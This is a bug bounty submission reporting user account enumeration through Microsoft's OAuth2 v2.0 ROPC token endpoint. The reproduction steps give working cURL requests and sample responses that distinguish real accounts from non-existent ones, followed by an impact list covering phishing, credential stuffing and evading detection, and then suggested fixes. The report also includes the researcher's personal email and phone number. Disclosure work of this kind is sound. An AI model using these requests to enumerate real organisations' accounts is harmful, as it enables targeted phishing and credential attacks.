# Kyiri Bug Bounty Submission Template

---

**Report ID:** 9  
**Submission Date:** 2026-03-19  
**Severity (initial):** ☑ High  
**Status:** ☑ New  

---

## 1. Researcher Information

| Field | Details |
|-------|---------|
| **Researcher Name** | Akash Athare |
| **Alias / Handle** | NA |
| **Email** | thebugbountyhunter151@gmail.com |
| **Phone / WhatsApp** | 7719031618 |
| **Telegram / Discord** | @reasearcherr |
| **Country** | India |

---

## 2. Vulnerability Details

| Field | Details |
|-------|---------|
| **Vulnerability Title** | User-Level Account Enumeration via OAuth2 v2.0 ROPC Token Endpoint with Multiple Resource Scopes |
| **Affected Asset / URL / Endpoint** | `https://login.microsoftonline.com/organizations/oauth2/v2.0/token` |
| **Affected Feature / Module** | OAuth 2.0 v2.0 Token Endpoint — Microsoft Identity Platform (MSAL v2) |
| **Tools Used** | cURL |

---

## 3. Summary

The OAuth 2.0 **v2.0** ROPC token endpoint at `/organizations/oauth2/v2.0/token` (the newer Microsoft Identity Platform endpoint, distinct from the v1 `/organizations/oauth2/token`) enables **user-level account enumeration**. This is the v2.0 endpoint that uses `scope` instead of `resource` parameters and follows the MSAL v2 token protocol.

When a POST request is sent with an existing email and wrong password, it returns AADSTS error code `50126` ("Error validating credentials"). When the email doesn't exist, it returns `50034` ("User account does not exist"). The enumeration works across **multiple scope values**, confirming the signal is not resource-specific:

- `https://graph.microsoft.com/.default`
- `https://outlook.office365.com/.default`
- `https://management.azure.com/.default`

This is a **separate endpoint** from the v1 OAuth2 token endpoint (`/organizations/oauth2/token`) — it uses a different URL path (`/v2.0/token`), different parameter format (`scope` vs `resource`), and is the current recommended endpoint for the Microsoft Identity Platform.

---

## 4. Steps to Reproduce

**Step 1 — Send a v2.0 ROPC request with an existing user email:**

```bash
curl -s -X POST "https://login.microsoftonline.com/organizations/oauth2/v2.0/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=password&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&scope=https://graph.microsoft.com/.default&username=admin@contoso.com&password=FakePass123!"
```

**Step 2 — Send the same v2.0 request with a non-existing email at the same domain:**

```bash
curl -s -X POST "https://login.microsoftonline.com/organizations/oauth2/v2.0/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=password&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&scope=https://graph.microsoft.com/.default&username=totallyinvaliduser999@contoso.com&password=FakePass123!"
```

**Step 3 — Compare the `error_codes` array in both JSON responses.**

**Step 4 — (Optional) Confirm with alternative scope values:**

```bash
# With Outlook scope
curl -s -X POST "https://login.microsoftonline.com/organizations/oauth2/v2.0/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=password&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&scope=https://outlook.office365.com/.default&username=admin@contoso.com&password=FakePass123!"
```

---

## 5. Proof of Concept / Evidence

### ✅ Existing user (`admin@contoso.com`) — Response:

```json
{
    "error": "invalid_grant",
    "error_description": "AADSTS50126: Error validating credentials due to invalid username or password.",
    "error_codes": [50126],
    "timestamp": "2026-03-19 01:55:12Z",
    "trace_id": "7774aa56-b0bc-448a-b66e-...",
    "correlation_id": "...",
    "error_uri": "https://login.microsoftonline.com/error?code=50126"
}
```

### ❌ Non-existing user (`totallyinvaliduser999@contoso.com`) — Response:

```json
{
    "error": "invalid_grant",
    "error_description": "AADSTS50034: The user account {EUII Hidden} does not exist in the contoso.com directory. To sign into this application, the account must be added to the directory.",
    "error_codes": [50034],
    "timestamp": "2026-03-19 01:55:12Z",
    "trace_id": "b0e5e0e1-f41c-441d-9189-...",
    "correlation_id": "...",
    "error_uri": "https://login.microsoftonline.com/error?code=50034"
}
```

### Confirmed across multiple scopes (all produce same signal):

| Scope | Valid User Code | Invalid User Code |
|-------|----------------|-------------------|
| `https://graph.microsoft.com/.default` | `50126` | `50034` |
| `https://outlook.office365.com/.default` | `50126` | `50034` |
| `https://management.azure.com/.default` | `50126` | `50034` |

### Signal Comparison:

| Scenario | AADSTS Code | Meaning |
|----------|-------------|---------|
| User **exists** (wrong password) | `50126` | "Error validating credentials due to invalid username or password" |
| User **does NOT exist** (valid tenant) | `50034` | "The user account does not exist in the directory" |

### Why this is distinct from the v1 endpoint:

| Property | v1 Endpoint | v2 Endpoint (this finding) |
|----------|------------|---------------------------|
| URL Path | `/organizations/oauth2/token` | `/organizations/oauth2/v2.0/token` |
| Resource Parameter | `resource=https://graph.microsoft.com` | `scope=https://graph.microsoft.com/.default` |
| Protocol | Azure AD v1 (ADAL) | Microsoft Identity Platform v2 (MSAL) |
| Account Types | Azure AD only | Azure AD + personal accounts |

---

## 6. Impact

This v2.0 endpoint enables **user-level account enumeration** identical to the v1 endpoint but through a separate, newer API surface. An attacker can:

- **Confirm whether specific email addresses belong to real Azure AD accounts** — enabling targeted phishing, credential stuffing, or social engineering
- **Use the modern v2.0 API surface** which may bypass WAF rules or monitoring specifically targeting the v1 endpoint
- **Test across multiple scopes** — the same enumeration works regardless of which Microsoft service scope is requested
- **Evade detection** — the `50034` (user not found) case often does not generate sign-in audit logs
- **No authentication required** — uses a well-known public client ID (`1b730954-1685-4b74-9bfd-dac224a7b894`, Azure PowerShell)

---

## 7. Suggested Fix (optional)

- Return a generic, unified error code for both "user not found" and "wrong password" scenarios on the v2.0 endpoint
- Implement progressive rate limiting and throttling
- Log `50034` responses in tenant sign-in audit logs for defender visibility
- Consider requiring client authentication for ROPC requests on the v2.0 endpoint

---

## 8. Researcher Declaration

☑ I confirm that this report is original and submitted in good faith.  
☑ I confirm that I did not intentionally harm users, data, or service availability.  
☑ I understand that reward eligibility depends on validation by the Kyiri team.  

**Researcher Signature:** Akash Athare  
**Date:** 2026-03-19  
**Reviewed By:** ______________________  
**Decision:** ☐ Valid   ☐ Duplicate   ☐ Rejected
